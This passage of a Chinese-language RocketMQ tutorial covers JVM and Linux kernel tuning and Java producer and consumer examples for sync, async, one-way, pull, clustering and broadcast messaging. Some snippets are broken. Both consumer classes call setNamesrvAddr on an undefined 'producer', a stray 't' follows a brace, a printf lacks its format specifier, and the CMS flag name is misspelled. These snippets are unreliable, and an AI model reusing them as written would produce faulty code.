<li><code>-XX:+CMSParallellnitialMarkEnabled</code>参数表示在初始标记的时候多线程执行，缩短停顿时间。</li>
</ol>
<p>也就是说RocketMQ提高了GC的频率，但是避免了垃圾对象过多，一次垃圾回收时间太长的问题。</p>
<h2 id="Linux内核参数"><a href="#Linux内核参数" class="headerlink" title="Linux内核参数"></a>Linux内核参数</h2><p>在部署RocketMQ的时候，还可以对Linux内核参数进行一定的定制。例如：</p>
<ul>
<li><strong>ulimit</strong>：需要进行大量的网络通信和磁盘IO。</li>
<li><strong>vm.extra_free_kbytes</strong>：告诉VM在后台回收（kswapd）启动的阈值与直接回收（通过分配进程）的阈值之间保留额外的可用内存。RocketMQ使用此参数来避免内存分配中的长延迟。（与具体内核版本相关）</li>
<li><strong>vm.min_free_kbytes</strong>：如果将其设置为低于1024KB，将会巧妙的将系统破坏，并且系统在高负载下容易出现死锁。</li>
<li><strong>vm.max_map_count</strong>：限制一个进程可能具有的最大内存映射区域数。RocketMQ将使用mmap加载CommitLog和ConsumeQueue，因此建议将为此参数设置较大的值。</li>
<li><strong>vm.swappiness</strong>：定义内核交换内存页面的积极程度。较高的值会增加攻击性，较低的值会减少交换量。建议将值设置为10来避免交换延迟。</li>
<li><strong>File descriptor limits</strong>：RocketMQ需要为文件（CommitLog和ConsumeQueue）和网络连接打开文件描述符。建议设置文件描述符的值为655350。</li>
</ul>
<blockquote>
<p>这些参数在CentOS7中的配置文件都在<code>/proc/sys/vm</code>目录下。另外，RocketMQ的<code>bin</code>目录下有个<code>os.sh</code>里面设置了RocketMQ建议的系统内核参数，可以根据情况进行调整。</p>
</blockquote>
<h1 id="消息发送模式"><a href="#消息发送模式" class="headerlink" title="消息发送模式"></a>消息发送模式</h1><p>搭建完了集群，下面我们就开始写消息收发的代码，研究RocketMQ的工作模式。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>导入MQ客户端依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>消息发送者步骤分析</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1.创建消息生产者producer，并制定生产者组名</span><br><span class="line">2.指定Nameserver地址</span><br><span class="line">3.启动producer</span><br><span class="line">4.创建消息对象，指定主题Topic、Tag和消息体（一个Topic可以有多个Tag）</span><br><span class="line">5.发送消息</span><br><span class="line">6.关闭生产者producer</span><br></pre></td></tr></table></figure>

<p>RocketMQ中Topic和Tag的关系，就相当于RabbitMQ中Exchange和routingKey的关系。</p>
<ul>
<li>消息消费者步骤分析</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1.创建消费者Consumer，制定消费者组名</span><br><span class="line">2.指定Nameserver地址</span><br><span class="line">3.订阅主题Topic和Tag</span><br><span class="line">4.设置回调函数，处理消息</span><br><span class="line">5.启动消费者consumer</span><br></pre></td></tr></table></figure>

<p>每个消费组都消费主题中一份完整的消息，不同消费组之间消费进度彼此不受影响。</p>
<p>也就是说，在负载均衡模式下，一条消息被Group1消费过，也会再给Group2消费。</p>
<p>而消费组中包含多个消费者，同一个组内的消费者是竞争消费的关系，每个消费者负责消费组内的一部分消息，也就是说如果一条消息被Consumer1消费了，那同组的其他消费者就不会再收到这条消息。</p>
<p>简单的组内消费是单例，组外消费是共享。</p>
<h2 id="基本消息"><a href="#基本消息" class="headerlink" title="基本消息"></a>基本消息</h2><h3 id="消息发送"><a href="#消息发送" class="headerlink" title="消息发送"></a>消息发送</h3><h4 id="发送同步消息"><a href="#发送同步消息" class="headerlink" title="发送同步消息"></a>发送同步消息</h4><p>发送后线程阻塞，直到mq响应。这种可靠性同步地发送方式使用的比较广泛，比如：重要的消息通知，短信通知。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SyncProducer</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    	    <span class="comment">// 创建消息，并指定Topic，Tag和消息体</span></span><br><span class="line">    	    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;topic1&quot;</span>,<span class="string">&quot;tag1&quot;</span>,(<span class="string">&quot;Hello RocketMQ &quot;</span> + i).getBytes());</span><br><span class="line">        	<span class="comment">// 发送同步消息</span></span><br><span class="line">            <span class="type">SendResult</span> <span class="variable">sendResult</span> <span class="operator">=</span> producer.send(msg);</span><br><span class="line">            <span class="comment">// 通过sendResult返回消息是否成功送达</span></span><br><span class="line">            System.out.printf(<span class="string">&quot;发送结果&quot;</span>, sendResult);</span><br><span class="line">    	&#125;t</span><br><span class="line">    	<span class="comment">// 如果不再发送消息，关闭Producer实例。</span></span><br><span class="line">    	producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="发送异步消息"><a href="#发送异步消息" class="headerlink" title="发送异步消息"></a>发送异步消息</h4><p>异步消息就是不等待mq响应，之后mq会调用一个<strong>回调方法</strong>。通常用在对响应时间敏感的业务场景，即发送端不能容忍长时间地等待Broker的响应：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        </span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 创建消息</span></span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;topic1&quot;</span>, <span class="string">&quot;tag2&quot;</span>, (<span class="string">&quot;消息&quot;</span> + i).getBytes());</span><br><span class="line">            <span class="comment">// 发送异步消息</span></span><br><span class="line">            producer.send(message, <span class="keyword">new</span> <span class="title class_">SendCallback</span>() &#123;</span><br><span class="line">                <span class="comment">// 发送成功回调方法</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(SendResult sendResult)</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;发送结果：&quot;</span> + sendResult);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 发送失败回调方法</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onException</span><span class="params">(Throwable throwable)</span> &#123;</span><br><span class="line">                    throwable.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">// 线程休眠2s（必要）</span></span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送消息结束，关闭Producer实例。</span></span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：发送异步消息时，线程休眠两秒是必要的。因为如果线程不等待，生产者发送完消息就会直接关闭，这样mq就无法调用其回调方法，会报错。</p>
<p>当然也可以使用CountDownLatch来等待完成。</p>
<h4 id="单向发送消息"><a href="#单向发送消息" class="headerlink" title="单向发送消息"></a>单向发送消息</h4><p>这种方式mq不会返回消息发送的结果，主要用在不特别关心发送结果的场景，例如日志发送。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OneWayProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;topic1&quot;</span>, <span class="string">&quot;tag3&quot;</span>, (<span class="string">&quot;消息&quot;</span> + i).getBytes());</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 使用sendOneway方法发送单向消息</span></span><br><span class="line">            producer.sendOneway(message);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送消息结束，关闭Producer实例。</span></span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="消息消费"><a href="#消息消费" class="headerlink" title="消息消费"></a>消息消费</h3><h4 id="推模式与拉模式"><a href="#推模式与拉模式" class="headerlink" title="推模式与拉模式"></a>推模式与拉模式</h4><p>RocketMQ中消费者消费消息有两种模式</p>
<p>一种是消费者主动去Broker上拉取消息的拉模式，另一种是消费者等待Broker把消息推送过来的推模式。</p>
<p>推模式的样例见：org.apache.rocketmq.example.simple.PushConsumer</p>
<ul>
<li>推模式的消费者实现类是<code>DefaultMQPushConsumer</code>，后面的代码中我们用的都是推模式，这种模式比较简单，只需要注册监听器监听MQ推送来的消息即可。</li>
<li>拉模式的消费者实现类是<code>DefaultMQPullConsumer</code>，它的用法如下：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PullConsumer</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 用于保存MessageQueue队列的偏移量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;MessageQueue, Long&gt; OFFSE_TABLE</span><br><span class="line">        = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;MessageQueue, Long&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MQClientException &#123;</span><br><span class="line">        <span class="comment">// 创建拉模式消费者DefaultMQPullConsumer</span></span><br><span class="line">        <span class="type">DefaultMQPullConsumer</span> <span class="variable">consumer</span> </span><br><span class="line">            <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPullConsumer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameserver地址</span></span><br><span class="line">        consumer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动消费者</span></span><br><span class="line">        consumer.start();</span><br><span class="line">        <span class="comment">// 根据需要订阅的主题，拿到主题所有的MessageQueue</span></span><br><span class="line">        Set&lt;MessageQueue&gt; mqs = consumer.fetchSubscribeMessageQueues(<span class="string">&quot;topic1&quot;</span>);</span><br><span class="line">        <span class="comment">// 遍历所有MessageQueue</span></span><br><span class="line">        <span class="keyword">for</span> (MessageQueue mq : mqs) &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;Consume from the queue: %s%n&quot;</span>, mq);</span><br><span class="line">            SINGLE_MQ:</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">/** 通过pullBlockIfNotFound方法从队列中拉取消息</span></span><br><span class="line"><span class="comment">                     *  参数1：MessageQueue队列</span></span><br><span class="line"><span class="comment">                     *  参数2：用于匹配需要订阅的消息的Tag</span></span><br><span class="line"><span class="comment">                     *  参数3：MessageQueue队列的偏移量，表示从哪开始消费</span></span><br><span class="line"><span class="comment">                     *  参数4：每次最多拉取多少消息</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="comment">// 注意拉取到消息后，消息仍然在队列中，不会被删除</span></span><br><span class="line">                    <span class="type">PullResult</span> <span class="variable">pullResult</span> <span class="operator">=</span></span><br><span class="line">                        consumer.pullBlockIfNotFound(mq, <span class="literal">null</span>, getMessageQueueOffset(mq), <span class="number">32</span>);</span><br><span class="line">                    System.out.printf(<span class="string">&quot;%s%n&quot;</span>, pullResult);</span><br><span class="line">                    <span class="comment">// 将偏移量保存</span></span><br><span class="line">                    putMessageQueueOffset(mq, pullResult.getNextBeginOffset());</span><br><span class="line">                    <span class="comment">// 判断结果状态</span></span><br><span class="line">                    <span class="keyword">switch</span> (pullResult.getPullStatus()) &#123;</span><br><span class="line">                        <span class="keyword">case</span> FOUND:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> NO_MATCHED_MSG:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> NO_NEW_MSG:</span><br><span class="line">                            <span class="keyword">break</span> SINGLE_MQ;</span><br><span class="line">                        <span class="keyword">case</span> OFFSET_ILLEGAL:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        consumer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取MessageQueue的偏移量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">getMessageQueueOffset</span><span class="params">(MessageQueue mq)</span> &#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">offset</span> <span class="operator">=</span> OFFSE_TABLE.get(mq);</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 保存MessageQueue的偏移量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putMessageQueueOffset</span><span class="params">(MessageQueue mq, <span class="type">long</span> offset)</span> &#123;</span><br><span class="line">        OFFSE_TABLE.put(mq, offset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到拉模式比较复杂，需要我们自己从Broker上获取队列拉取消息，并且还需要管理消息队列的偏移量。但实际上RocketMQ的推模式也是由拉模式封装出来的。</p>
<blockquote>
<p>新版本中<code>DefaultMQPullConsumer</code>这个消费者类已标记为过期，但是还是可以使用的。替换的类是<code>DefaultLitePullConsumer</code>，它简化了老版本拉模式的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LitePullConsumerSubscribe</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">running</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="comment">// 创建拉模式消费者DefaultLitePullConsumer</span></span><br><span class="line">  <span class="type">DefaultLitePullConsumer</span> <span class="variable">litePullConsumer</span></span><br><span class="line">      <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultLitePullConsumer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">  <span class="comment">// 订阅主题</span></span><br><span class="line">  litePullConsumer.subscribe(<span class="string">&quot;topic1&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  <span class="comment">// 启动消费者</span></span><br><span class="line">  litePullConsumer.start();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">          <span class="comment">// 从mq中主动拉取消息</span></span><br><span class="line">          List&lt;MessageExt&gt; messageExts = litePullConsumer.poll();</span><br><span class="line">          System.out.printf(<span class="string">&quot;%s%n&quot;</span>, messageExts);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      litePullConsumer.shutdown();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了这种简单的拉模式，新版本中仍然提供了一种可以自己管理偏移量和队列的拉取消息方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LitePullConsumerAssign</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">running</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="comment">// 创建拉模式消费者DefaultLitePullConsumer</span></span><br><span class="line">     <span class="type">DefaultLitePullConsumer</span> <span class="variable">litePullConsumer</span> </span><br><span class="line">         <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultLitePullConsumer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">     <span class="comment">// 关闭自动提交</span></span><br><span class="line">     litePullConsumer.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">     <span class="comment">// 开启消费者</span></span><br><span class="line">     litePullConsumer.start();</span><br><span class="line">     <span class="comment">// 根据需要订阅的主题，拿到主题所有的MessageQueue</span></span><br><span class="line">     Collection&lt;MessageQueue&gt; mqSet</span><br><span class="line">         = litePullConsumer.fetchMessageQueues(<span class="string">&quot;topic1&quot;</span>);</span><br><span class="line">     List&lt;MessageQueue&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(mqSet);</span><br><span class="line">     List&lt;MessageQueue&gt; assignList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">     <span class="comment">// 示例中取主题一半的MessageQueue</span></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size() / <span class="number">2</span>; i++) &#123;</span><br><span class="line">         assignList.add(list.get(i));</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 绑定队列</span></span><br><span class="line">     litePullConsumer.assign(assignList);</span><br><span class="line">     <span class="comment">// 从指定的队列和偏移量开始拉取消息</span></span><br><span class="line">     litePullConsumer.seek(assignList.get(<span class="number">0</span>), <span class="number">10</span>);</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">while</span> (running) &#123;</span><br><span class="line">             <span class="comment">// 从mq中主动拉取消息</span></span><br><span class="line">             List&lt;MessageExt&gt; messageExts = litePullConsumer.poll();</span><br><span class="line">             System.out.printf(<span class="string">&quot;%s %n&quot;</span>, messageExts);</span><br><span class="line">             <span class="comment">// 同步提交消费结果</span></span><br><span class="line">             litePullConsumer.commitSync();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         litePullConsumer.shutdown();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="负载均衡模式"><a href="#负载均衡模式" class="headerlink" title="负载均衡模式"></a>负载均衡模式</h4><p>在负载均衡模式(又称集群模式)下，<strong>同一个消费者组的多个消费者共同消费消息时，一条消息只会被一个消费者消费：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建消费者</span></span><br><span class="line">        <span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 订阅Topic,Tag;* 表示订阅所有Tag</span></span><br><span class="line">        consumer.subscribe(<span class="string">&quot;topic1&quot;</span>,<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="comment">/** 消费模式</span></span><br><span class="line"><span class="comment">         *  负载均衡（默认）：MessageModel.CLUSTERING</span></span><br><span class="line"><span class="comment">         *  广播：MessageModel.BROADCASTING</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        consumer.setMessageModel(MessageModel.CLUSTERING);</span><br><span class="line">        <span class="comment">// 设置消息监听触发器</span></span><br><span class="line">        consumer.registerMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerConcurrently</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 监听方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ConsumeConcurrentlyStatus <span class="title function_">consumeMessage</span><span class="params">(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context)</span> &#123;</span><br><span class="line">                <span class="comment">// 输出消息</span></span><br><span class="line">                <span class="keyword">for</span> (MessageExt msg : msgs) &#123;</span><br><span class="line">                    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(msg.getBody()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/** 监听方法返回值</span></span><br><span class="line"><span class="comment">                /*  失败：ConsumeConcurrentlyStatus.RECONSUME_LATER</span></span><br><span class="line"><span class="comment">                 *  成功：ConsumeConcurrentlyStatus.CONSUME_SUCCESS</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 启动消费者</span></span><br><span class="line">        consumer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里需要注意：负载均衡指的是对一个消费者组的多个消费者负载均衡。如果是多个消费者组订阅了相同的Topic的情况，那么该Topic下的同一条消息会发送给所有订阅的消费者组。</p>
</blockquote>
<h4 id="广播模式"><a href="#广播模式" class="headerlink" title="广播模式"></a>广播模式</h4><p>消费者采用广播的方式消费消息，多个消费者共同消费消息时，<strong>每条消息都会被所有消费者消费</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建消费者</span></span><br><span class="line">        <span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 订阅Topic,Tag;* 表示订阅所有Tag</span></span><br><span class="line">        consumer.subscribe(<span class="string">&quot;topic1&quot;</span>,<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="comment">// 广播消费模式</span></span><br><span class="line">        consumer.setMessageModel(MessageModel.BROADCASTING);</span><br><span class="line">        <span class="comment">// 设置消息监听触发器</span></span><br><span class="line">        consumer.registerMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerConcurrently</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 监听方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ConsumeConcurrentlyStatus <span class="title function_">consumeMessage</span><span class="params">(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context)</span> &#123;</span><br><span class="line">                <span class="comment">// 输出消息</span></span><br><span class="line">                <span class="keyword">for</span> (MessageExt msg : msgs) &#123;</span><br><span class="line">                    System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(msg.getBody()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 启动消费者</span></span><br><span class="line">        consumer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="顺序消息"><a href="#顺序消息" class="headerlink" title="顺序消息"></a>顺序消息</h2><p>消息有序指的是可以按照消息的发送顺序来消费(FIFO)。RocketMQ可以严格的保证消息有序，可以分为分区有序或者全局有序。</p>
<p>顺序消费的原理解析：</p>
<p>在默认的情况下消息发送会采取Round Robin轮询方式把消息发送到Topic下不同的queue(分区队列)；</p>
<p>而消费消息的时候从多个queue上拉取消息，这种情况发送和消费是不能保证顺序。</p>
<p>但是如果控制发送的顺序消息只依次发送到同一个queue中，消费的时候只从这个queue上依次拉取，就保证了顺序。当发送和消费参与的queue只有一个，则是全局有序；如果多个queue参与，则为分区有序，即相对每个queue，消息都是有序的。</p>
<p>下面用发送订单消息演示分区有序的。一个订单的顺序流程是：创建、付款、推送、完成。订单号相同的消息会被先后发送到同一个队列中，消费时，要保证同一个线程只从一个队列获取消息。</p>
<h3 id="顺序消息生产"><a href="#顺序消息生产" class="headerlink" title="顺序消息生产"></a>顺序消息生产</h3><ul>
<li>订单实体类</li>
</ul>
